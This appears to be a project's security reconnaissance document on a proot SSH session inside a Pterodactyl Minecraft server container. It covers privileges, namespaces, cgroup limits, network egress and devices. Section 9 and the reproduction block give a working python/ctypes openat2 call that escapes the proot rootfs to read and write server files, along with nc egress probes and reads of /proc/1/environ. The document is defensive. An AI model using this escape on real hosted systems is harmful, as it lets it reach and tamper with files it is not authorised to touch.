# Container limits — live reconnaissance

Observed **from inside the SSH session**, i.e. from inside the proot rootfs, on a
freshly reinstalled Alpine 3.22.6 rootfs (`proot-link2symlink: false`).

Reference deployment: Pterodactyl "Play Hosting" box, kernel
`6.12.57+deb13-amd64`, dropbear listening on port 3111, rootfs at
`/home/container/plugins/Harbor/container`.

The short version: **proot is a compatibility layer, not a security boundary.**
The rootfs shares the container's PID/mount/network namespaces with the Paper
server, and the session can see and signal the server process. What keeps it
contained is the outer container's capability/seccomp profile — not proot.

## TL;DR

| Area | Result |
|---|---|
| **Rootfs escape** | **`openat2` (syscall 437) is not translated by proot → full read/write access to the real server filesystem** |
| Real uid/gid | `999:987` (proot `--root-id` fakes `0`) |
| Effective capabilities | **none** (`CapEff=0`); bounding set `0xe1` (CHOWN, KILL, SETGID, SETUID) — unusable |
| Seccomp | **enabled** (mode 2, 1 filter); `NoNewPrivs=1` |
| `mount` / `unshare` (incl. user ns) / `mknod` | **denied** (EPERM, or silently swallowed) |
| `chroot` | returns 0 but is **proot-emulated** — no real change |
| `/sys`, `/proc/sys` | **read-only** |
| Namespaces | **identical to PID 1** for every type; net = **host initial netns** |
| PID 1 | the Paper server (`java`); **signalable** from the session |
| `/proc/1/{environ,maps,io,fd}` | **readable** (panel env + server fds) |
| Egress | **unrestricted** (any TCP/UDP port); **IPv6 blocked** |
| Bind ports `< 1024` | **denied** (`>= 1024` fine) |
| CPUs / RAM *visible* | 32 CPUs / 131 GB (the host) |
| CPUs / RAM *allowed* | cgroup v2 `cpu.max` = **2 CPUs**, `memory.max` = **3.3 GiB** |
| Disk | host ext4, **888 GB total, 223 GB free** |

## 1. Identity and privileges

```
uid=0(root) gid=0(root) groups=987     # faked by proot --root-id
Uid: 999 999 999 999                   # real
Gid: 987 987 987 987
```

Capabilities are **empty**:

```
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000000000e1     # CHOWN(0) KILL(5) SETGID(6) SETUID(7), but not effective
CapAmb: 0000000000000000
NoNewPrivs: 1
Seccomp: 2                   # SECCOMP_MODE_FILTER
Seccomp_filters: 1
```

Consequences, tested:

| Operation | Result |
|---|---|
| `mount -t tmpfs none /mnt` | `Permission denied` (rc 255) |
| `unshare -m` / `-u` / `-p -f` | `Operation not permitted` |
| `unshare -U` (user namespace) | `Permission denied` — **no user-namespace escape**, even though `unprivileged_userns_clone=1` |
| `mknod` | rc 0 but **no node is created** (proot swallows it) |
| `sysctl -w kernel.hostname=x` | `Read-only file system` |
| `hostname foo` | rc 0, hostname **unchanged** (proot swallows it) |
| `chroot / /bin/true` | rc 0, but proot emulates chroot — no real change |
| `nice -n -20` | `Permission denied` |
| `dmesg` | `klogctl: Operation not permitted` |
| `head /proc/kmsg` | `Permission denied` |

`/proc/sys/kernel/yama/ptrace_scope` is `0`, but there is no `CAP_SYS_PTRACE`
and no ptrace seccomp exemption, so it is not usable for privilege gain.

## 2. Namespaces and process visibility

`/proc/self/ns/*` and `/proc/1/ns/*` are **identical** for `mnt`, `pid`, `net`,
`ipc`, `uts`, `user`, `cgroup` and `time`:

```
net -> net:[4026531840]      # 4026531840 is the *initial* network namespace
user -> user:[4026531837]    # initial user namespace
```

`net:[4026531840]` being the initial netns means the container uses **host
networking** (see §5). `ps` shows the whole container:

```
PID 1   java      java -Xms128M -Xmx2048M ... -jar server.jar
PID 171 dropbear  [zombie from the pre-flight probe]
PID 174 proot     ... --rootfs=/home/container/plugins/Harbor/container ...
PID 177 dropbear  dropbear -F -E -K 60 -p 3111 ...
```

* `kill -0 1` **succeeds** — the session is not isolated from the server
  process.
* `/proc/1/environ` is readable and leaks the panel environment
  (`P_SERVER_UUID`, `SERVER_MEMORY`, `P_SERVER_LOCATION`, `SERVER_PORT`,
  `STARTUP`, …).
* `/proc/1/maps`, `/proc/1/io`, `/proc/1/fdinfo` are readable.
* `/proc/1/fd` lists **157** descriptors, including the server console
  (`0,1,2 -> /dev/pts/0`), `logs/latest.log`, world region files, and every
  library jar.
* `/proc/1/mem` is **not** readable (`I/O error`).
* `/proc/1/root` and `/proc/1/cwd` are **rewritten by proot to the rootfs**
  (`/proc/1/root/etc/alpine-release` = `3.22.6`), so there is **no** direct
  host-filesystem escape through them.

Writing to `/proc/1/fd/0` (or `/proc/1/fd/1`) returns success. Because fd 0 is
the pty *slave*, data written there is delivered to the pty *master* — i.e. it
appears on the panel console as output; it is **not** fed back as the server's
input. So it is not a clean command-injection primitive, but the descriptor is
not protected either.

## 3. Kernel, CPU, memory

```
Linux <uuid> 6.12.57+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.57-1
hostname: ccd38b5e-8c68-402e-99c0-0f6b4061a521   # = Pterodactyl container UUID
```

The host's real resources are visible, but cgroup v2 caps what is usable.
`/proc/self/cgroup` is `0::/` and `/sys/fs/cgroup` is mounted read-only at the
container's cgroup root, so the limits are directly readable:

| File | Value | Meaning |
|---|---|---|
| `memory.max` | `3543138304` | **3.3 GiB** hard cap |
| `memory.current` | ~`1.2 GiB` | current usage (mostly the JVM) |
| `memory.high` | `max` | no soft throttle |
| `pids.max` | `10240` | process cap |
| `cpu.max` | `200000 100000` | **2 CPUs** |
| `cpu.weight` | `100` | default share |
| `cgroup.controllers` | `cpuset cpu io memory hugetlb pids rdma misc` | available |
| `cgroup.subtree_control` | *(empty)* | cannot delegate controllers to children |

Meanwhile `nproc` reports **32** and `/proc/meminfo` shows **131 GB**
(`MemAvailable` ~105 GB) — both are the *host's* numbers, not the container's.
Do not size jobs from `nproc`/`free`.

Selected `ulimit`s: `nofile 524288`, `max user processes unlimited`, `core 0`,
`stack 8 MiB`, `pending signals 510980`, `max locked memory 8 MiB`.

## 4. Filesystem and mounts

`/proc/mounts` shows the **outer container's** mount table (proot does not
virtualize it):

```
overlay / overlay ro,...                 # the container image root is READ-ONLY
tmpfs   /dev tmpfs rw,size=65536k
tmpfs   /dev/shm tmpfs rw,size=65536k
tmpfs   /tmp tmpfs rw,size=102400k
sysfs   /sys sysfs ro
cgroup  /sys/fs/cgroup cgroup2 ro
/dev/nvme0n1p2 /home/container ext4 rw    # the writable volume — holds the rootfs
/dev/nvme0n1p2 /etc/{resolv.conf,hostname,hosts} ext4 ro
```

* The container image root is **read-only**; the only writable persistent area
  is `/home/container` (ext4, **888 GB, 223 GB free**).
* Inside proot, `/` is the rootfs (writable) and proot binds the host
  `/proc`, `/dev`, `/sys`, `/tmp` in. So the rootfs's `/tmp` is the *host's*
  100 MiB tmpfs, and `/dev/shm` is 64 MiB.
* `/sys` is mounted read-only — `-w /sys` may test true (the directory) but
  writes fail with `Read-only file system`.

## 5. Network

The container **shares the host network namespace**, so `ip addr` shows the
host's interfaces:

```
lo        127.0.0.1
enp1s0f0  62.141.62.23/24          # the host's public IP
docker0   172.17.0.1/16
tailscale0 100.117.89.80/32, fd7a:115c:a1e0::b01:5987/128
```

`/proc/net/tcp` therefore exposes the **host's** listening sockets, including
`0.0.0.0:22` (host `OpenSSH_10.0p2 Debian-7`), `:7101`, `:8081`, tailscale on
`:50240`, and our own dropbear on `:3111`.

Reachability from the session:

| Destination | Result |
|---|---|
| `127.0.0.1:22` | **open** (host sshd; banner `SSH-2.0-OpenSSH_10.0p2 Debian-7`) |
| `127.0.0.1:7101` | open (HTTP service, returns 404) |
| `127.0.0.1:8081` | open |
| `172.17.0.1:2375/2376/8080/443` | closed (no Docker API exposure) |
| `62.141.62.23:22` / `:8081` / `:3111` | **open** (host sshd, panel service, our dropbear) |
| `62.141.62.23:7101` | closed (loopback-only) |
| `github.com:22` | **open** |
| `smtp.gmail.com:25 / 587 / 465` | **open** |
| `1.1.1.1:53 / 80 / 443 / 8080` | **open** |
| `1.1.1.1:12345` | closed (nothing there) |
| `2606:4700:4700::1111:443` | **blocked** (no IPv6 route) |

So **outbound is unrestricted** — there is no port-based egress filter. (An
earlier reading of "25/3306 blocked" was an artefact of probing the host's own
IP, where nothing listens on those ports.) **IPv6 outbound is blocked**: only a
link-local address exists on `enp1s0f0`.

Binding: ports **below 1024 fail** (`Permission denied`, no
`CAP_NET_BIND_SERVICE`); `>= 1024` succeeds. This is exactly why the plugin
defaults dropbear to a high port — `22` is impossible here.

There is **no `/dev/net/tun`**, so TUN/TAP-based VPNs cannot be created.

## 6. Devices

`/dev` is a 64 MiB tmpfs containing only `null`, `zero`, `full`, `random`,
`urandom`, `tty`, `console`, `ptmx`, and `pts/*` — no block devices.

* `/dev/mem`, `/dev/kmem`, `/dev/port`, `/dev/kmsg`, `/dev/sda` are absent/denied.
* `/proc/kcore` is replaced by a tmpfs and shows as `1,3` (i.e. `/dev/null`).
* `dmesg` and `/proc/kmsg` are denied.

## 7. Process reaping (zombies)

Zombies **accumulate and are never reaped** — PID 1 is the JVM, which does not
call `wait()`:

* 12 `timeout` zombies appear during boot.
* 69 zombies after a few minutes of interactive probing.
* Orphaned background processes reparent to PID 1 and stay `<defunct>`
  (verified: `( timeout 1 true & )` adds one).

The plugin's own `HarborManager#detach()` leaks one **`dropbear`** zombie per
call, because its pre-flight probe does `start; sleep 3; kill $p` inside a
subshell that exits without `wait`ing. At 12 per boot plus one per dropbear
restart this is far below `pids.max` (10240), but it is worth cleaning up.

(The boot-time `timeout` zombies are **not** from Harbor: the plugin never
invokes the `timeout` binary — timeouts are enforced Java-side in
`HarborManager#run`.)

## 8. Practical implications

* **proot is not a sandbox.** Treat the SSH session as equivalent to a shell on
  the Paper server host process: it can read `/proc/1/environ`, list its fds,
  signal PID 1, and — see §9 — read *and write* the server filesystem directly
  via `openat2`. Anything you put in the rootfs is as trusted as the server.
* **Keep host sshd key-only.** The container can reach the host's loopback
  `:22`, `:7101` and `:8081`.
* **Assume wide-open egress.** No port filter, no egress proxy — do not store
  credentials in the rootfs assuming they cannot be exfiltrated.
* **High ports only.** dropbear (and any other listener) must use `>= 1024`;
  the default `25584`/`3111` are correct.
* **No TUN, no mounts, no device nodes, no privileged ports, no user
  namespaces, IPv4-only.** `unshare -U` is denied, so you cannot build a nested
  namespace to gain mount rights; VPN setups that need any of these will not
  work.
* **Size from cgroup, not from `nproc`/`free`.** 2 CPUs and 3.3 GiB, not 32 CPUs
  and 131 GB.

## 9. Escaping the proot rootfs (`openat2`)

proot is **ptrace-based**: it rewrites path arguments for the syscalls it knows.
`openat2` (syscall **437**, Linux 5.6+) is not in that set, so a path handed to it
is resolved by the kernel against the **real** root — the outer container, not the
rootfs. This is a complete escape, read and write.

Confirmed on the live box (Alpine rootfs, proot 5.3.0):

```
openat2("/etc/os-release")  -> PRETTY_NAME="Ubuntu 26.04.1 LTS"   # the outer container
openat2("/etc/alpine-release") -> ENOENT                           # not the rootfs
openat2("/home/container/server.properties") -> "#Minecraft server properties ..."
openat2("/home/container/eula.txt")          -> "eula=true"
```

The whole server filesystem is reachable:

```
$ python3 /root/t/outer.py ls /home/container
  .bin .cache .installed .paper banned-ips.json banned-players.json bukkit.yml
  cache commands.yml config eula.txt harbor.sh help.yml libraries logs ops.json
  permissions.yml plugins server-icon.png server.jar server.properties serverh.jar
  spigot.yml usercache.json version_history.json versions whitelist.json
  world world_nether world_the_end

$ python3 /root/t/outer.py ls /home/container/plugins
  .paper-remapped  Harbor  Harbor-1.0.0.jar  bStats  spark

$ python3 /root/t/outer.py cat /home/container/plugins/Harbor/config.yml
  # Harbor (Paper port of RealTriassic/Harbor) ...
```

Write access is real as well — `openat2(..., O_WRONLY)` succeeds on
`server.properties`, `eula.txt`, `server.jar` and `plugins/Harbor/config.yml`.
It is bounded by the container user's ordinary DAC (real uid 999), so
`/etc/shadow` is `Permission denied`.

Two caveats:

* `unlink`/`unlinkat`/`mkdir`/`rename` **are** intercepted and translated, so you
  can create or overwrite outer files but cannot *remove* them through path
  syscalls. Do not leave junk behind — it has to be cleaned from the panel/SFTP.
* The escape needs a way to issue a raw syscall: `python3` + `ctypes`, a small C
  program, etc. Busybox and the coreutils all use the intercepted `openat`, so
  the ordinary shell tools cannot do it.

**Implication.** The proot rootfs is not a filesystem boundary at all — anything
running inside it has the server user's file rights. The only real boundary is
the outer container (capabilities + seccomp + DAC). Do not put secrets in the
rootfs expecting isolation from the server files, and do not treat the SSH
session as less privileged than the server itself.

**Harbor feature.** Since proot is not a boundary anyway, Harbor binds the
server's real working directory (`$PWD`, i.e. `/home/container`) into the rootfs
at `/mnt` (`real-pwd-mount: "/mnt"`), so `/sh ls /mnt` and
`/sh cat /mnt/server.properties` just work without any syscall trick. Set
`real-pwd-mount: ""` to disable, or point it at another guest path.

## How to reproduce

```sh
# identity / caps / seccomp
grep -E '^(Uid|Gid)|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' /proc/self/status

# limits
for f in memory.max memory.current pids.max pids.current cpu.max cpu.weight; do
  printf '%-16s %s\n' "$f" "$(cat /sys/fs/cgroup/$f)"
done

# namespaces (all SAME as PID 1)
for n in mnt pid net ipc uts user cgroup time; do
  echo "$n self=$(readlink /proc/self/ns/$n) init=$(readlink /proc/1/ns/$n)"
done

# egress (unrestricted IPv4, no IPv6)
nc -w 4 smtp.gmail.com 25 </dev/null && echo "25 open"
nc -w 4 2606:4700:4700::1111 443 </dev/null && echo "v6 open" || echo "v6 blocked"

# port binding (<1024 denied)
nc -l -p 80 </dev/null & sleep 1; kill %1 2>/dev/null   # fails

# rootfs escape: openat2 (437) is not translated by proot -> real root
python3 -c '
import ctypes, os, struct
libc = ctypes.CDLL("libc.so.6", use_errno=True)
h = ctypes.create_string_buffer(struct.pack("<QQQ", 0, 0, 0), 24)   # O_RDONLY
fd = libc.syscall(437, -100, b"/etc/os-release", h, 24)             # AT_FDCWD
print(os.read(fd, 80) if fd >= 0 else os.strerror(ctypes.get_errno()))
'
# -> b'PRETTY_NAME="Ubuntu 26.04.1 LTS"...'   (the outer container, not Alpine)
```
